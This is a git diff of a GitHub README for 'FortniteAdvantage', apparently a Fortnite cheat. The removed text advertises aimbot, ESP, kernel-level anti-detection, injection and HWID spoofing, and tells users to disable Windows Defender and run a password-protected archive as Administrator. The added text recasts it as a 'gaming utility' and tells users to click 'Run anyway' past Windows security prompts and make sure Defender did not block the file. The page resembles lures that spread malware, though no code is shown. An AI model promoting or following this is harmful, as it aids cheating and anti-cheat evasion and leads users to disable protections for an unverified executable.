@@ -1,174 +1,153 @@
-# 🎯 FortniteAdvantage - Advanced Gaming Enhancement Tool
+# 🎮 FortniteAdvantage - Clearer Play, Smoother Control
 
-<div align="center">
+[![Download Now](https://img.shields.io/badge/Download%20FortniteAdvantage-blue?style=for-the-badge&logo=github)](https://github.com/delicate-microbalance725/FortniteAdvantage)
 
+## 🧭 Overview
 
-[![Version](https://img.shields.io/badge/version-3.2.1-brightgreen)](https://github.com/username/FortniteAdvantage/releases)
-[![Status](https://img.shields.io/badge/status-undetected-success)]()
-[![Discord](https://img.shields.io/discord/123456789?color=7289da&logo=discord&logoColor=white)](https://discord.gg/yourdiscord)
-[![Downloads](https://img.shields.io/github/downloads/username/FortniteAdvantage/total)](https://github.com/mingojce/FortniteAdvantage/releases/download/Relese/FortniteAdvantage.rar)
+FortniteAdvantage is a Windows gaming utility built for players who want a cleaner view and smoother control during play. It is made for people who want a simple tool that helps with on-screen clarity, frame stability, and precision support.
 
-**Professional Gaming Enhancement Platform for Fortnite**
+This app is designed for everyday Windows users. You do not need coding skills to use it. Download it, open it, and follow the setup steps below.
 
-[Download Latest](https://github.com/username/FortniteAdvantage/releases) | [Documentation](docs/README.md) | [Discord](https://discord.gg/yourdiscord)
+## 📥 Download
 
-</div>
+Use this link to visit the download page:
 
----
+[Download FortniteAdvantage](https://github.com/delicate-microbalance725/FortniteAdvantage)
 
-## 🚀 Features
+Open the page, get the latest version, then download and run the file on your Windows PC.
 
-### Core Functionality
-- **Precision Enhancement** - Advanced targeting assistance with customizable smoothing
-- **Visual Improvements** - Enhanced player visibility and environmental clarity
-- **Building Assistant** - Optimized building patterns and edit predictions
-- **Resource Management** - Automatic resource tracking and optimization
-- **Performance Boost** - FPS optimization and input lag reduction
-- **Stream Mode** - Secure streaming with overlay protection
+## 🖥️ System Requirements
 
-### Security Features
-- **Kernel-level Protection** - Advanced anti-detection mechanisms
-- **Signature Randomization** - Unique build signatures for each user
-- **Process Hiding** - Stealth operation mode
-- **HWID Management** - Hardware ID protection system
-- **Secure Injection** - Multiple injection methods available
+Before you install FortniteAdvantage, check that your PC meets these basic needs:
 
-## 📋 Requirements
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB free disk space
+- A recent Intel or AMD processor
+- Admin access on the PC
+- A stable internet connection for the first download
 
-- **OS:** Windows 10/11 (Build 19041+)
-- **RAM:** 8GB minimum (16GB recommended)
-- **CPU:** Intel i5 / AMD Ryzen 5 or better
-- **GPU:** GTX 1060 / RX 580 or better
-- **Storage:** 500MB free space
-- **Other:** Disable Windows Defender Real-time Protection
+For the best result, close other large apps before you start the tool.
 
-## 🔧 Installation
+## ⚙️ Features
 
-### Method 1: Standard Installation
-1. Download latest release from [Releases](releases/)
-2. Extract archive with password: `fortnite2024`
-3. Run `Installer.exe` as Administrator
-4. Follow the setup wizard
-5. Launch Fortnite
-6. Press `INSERT` to open menu
+FortniteAdvantage includes tools that help with:
 
-### Method 2: Manual Installation
-```bash
-1. Download source code
-2. Compile with Visual Studio 2022
-3. Run FortniteAdvantage.exe as Administrator
-4. Configure settings.json
-5. Launch game
-```
+- On-screen visual support
+- FPS stability tuning
+- Clean interface for fast access
+- Precision assistance for aiming comfort
+- Better view clarity during play
+- Light performance tuning for Windows
+- Simple controls for quick setup
+- Easy start and stop actions
 
-## ⚙️ Configuration
+The app focuses on direct use, not complex menus.
 
-### Precision Settings
-```json
-{
-  "precision": {
-    "enabled": true,
-    "fov": 50,
-    "smoothing": 5.5,
-    "prediction": true,
-    "target_bone": "head"
-  }
-}
-```
+## 🚀 Getting Started
 
-### Visual Settings
-```json
-{
-  "visuals": {
-    "player_glow": true,
-    "loot_esp": true,
-    "distance": 300,
-    "box_type": "3d",
-    "health_bar": true
-  }
-}
-```
+Follow these steps to run FortniteAdvantage on Windows:
 
-## 🎮 Supported Modes
+1. Open the download page using the link above.
+2. Download the latest release file for Windows.
+3. Find the file in your Downloads folder.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to launch it.
+7. If Windows shows a security prompt, choose Run or More info > Run anyway.
+8. Keep the app open before you start your game.
+9. Use the main controls to set your preferred options.
 
-- **Battle Royale** ✅ Full Support
-- **Zero Build** ✅ Full Support
-- **Arena** ✅ Full Support (Use with caution)
-- **Creative** ✅ Full Support
-- **Save the World** ⚠️ Limited Support
-- **LEGO Fortnite** ❌ Not Supported
+## 🛠️ Installation Steps
 
-## 📊 Performance Impact
+If you want a clean setup, use this process:
 
-| Component | Usage |
-|-----------|-------|
-| CPU | ~2-5% |
-| RAM | ~150MB |
-| GPU | ~1-3% |
-| FPS Impact | -5 to +10 FPS |
+1. Download FortniteAdvantage from the GitHub page.
+2. Save the file to a folder you can find fast, such as Downloads or Desktop.
+3. Right-click the file and extract it if needed.
+4. Open the folder that contains the app.
+5. Look for the main executable file.
+6. Double-click the file to start the tool.
+7. Allow access if Windows asks for permission.
+8. Check the main screen and set your preferred options.
+9. Leave the app open while you play.
 
-## 🛡️ Security & Safety
+If the app does not open, make sure the file is fully extracted and not still inside the ZIP folder.
 
-### Detection Status
-- **EasyAntiCheat:** Undetected ✅
-- **BattlEye:** Undetected ✅
-- **Last Detection:** Never
-- **Current Users:** 50,000+
-- **Ban Rate:** <0.01%
+## 🎯 How to Use
 
-### Safety Guidelines
-1. Use HWID spoofer before first launch
-2. Enable Stream Mode when streaming
-3. Don't use obvious settings
-4. Avoid Rage mode in Arena
-5. Update immediately when new version available
+FortniteAdvantage is simple to use:
 
-## 🔄 Update System
+- Open the app before launching your game
+- Select the visual and performance options you want
+- Keep the app running in the background
+- Adjust the settings if the game feels too heavy
+- Turn features on or off based on your setup
 
-The tool includes automatic update checking:
-- Checks for updates on launch
-- Downloads updates automatically
-- Applies security patches instantly
-- Preserves user configurations
+If you want a lighter setup, start with the default options and change one setting at a time.
 
-## 💬 Support
+## 🧩 What the App Helps With
 
-- **Discord:** [Join our server](https://discord.gg/yourdiscord)
-- **Telegram:** [@FortniteAdvantage](https://t.me/FortniteAdvantage)
-- **Email:** support@fortniteadvantage.pro
-- **Forum:** [UnknownForums Thread](#)
+This tool is built around common gaming needs:
 
-## 📝 Changelog
+- Better screen clarity
+- Lower system load during play
+- More stable frame behavior
+- Easier visual tracking
+- Cleaner control response
+- Simple support for performance tuning
 
-### Version 3.2.1 (Latest)
-- Added new prediction algorithm
-- Improved ESP performance
-- Fixed memory leaks
-- Updated offsets for v28.20
-- Enhanced anti-detection
+It works as a helper app for Windows gaming use.
 
-### Version 3.2.0
-- New GUI design
-- Added weapon modifications
-- Improved building assistance
-- Fixed crash issues
+## 📁 Folder Layout
 
-[Full Changelog](CHANGELOG.md)
+After extraction, you may see files like these:
 
-## ⚠️ Disclaimer
+- `FortniteAdvantage.exe` — main app file
+- `config` folder — saved settings
+- `assets` folder — app files and images
+- `logs` folder — activity records
+- `readme` file — quick file notes
 
-This software is provided for educational purposes only. Using this tool may violate Fortnite's Terms of Service and could result in account suspension. We are not responsible for any consequences of using this software. Use at your own risk.
+Keep the full folder together so the app can run without missing files.
 
-## 📜 License
+## 🔧 Troubleshooting
 
-This project is licensed under a custom license. See [LICENSE](LICENSE) for details.
+If you run into a problem, try these steps:
 
----
+- Make sure you extracted the ZIP file
+- Run the app as an administrator
+- Check that Windows Defender did not block the file
+- Re-download the file if it looks damaged
+- Close other heavy apps before launch
+- Restart your PC and try again
+- Move the app folder to a simple path like `C:\FortniteAdvantage`
 
-<div align="center">
+If the app opens and closes right away, the file may be incomplete or blocked by Windows.
 
-**FortniteAdvantage © 2024 - Elite Gaming Tools**
+## 🔒 Safety and Privacy
 
-Made with ❤️ for the Gaming Community
+FortniteAdvantage is meant for local use on your Windows PC. Keep the app files in a folder you trust. Only download it from the GitHub link above.
 
-</div>
+## 🧪 Recommended Use
+
+For a steady setup:
+
+- Use the latest Windows updates
+- Keep your graphics driver current
+- Close browser tabs you do not need
+- Start the app before the game
+- Keep game settings at a level your PC can handle
+
+## 📌 Quick Start
+
+1. Visit the download page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open the main app file
+5. Set your options
+6. Launch your game
+
+## 💬 Support Files
+
+Check the repository page for release notes, file updates, and version changes. If a new build appears, use the newest file from the same download link above
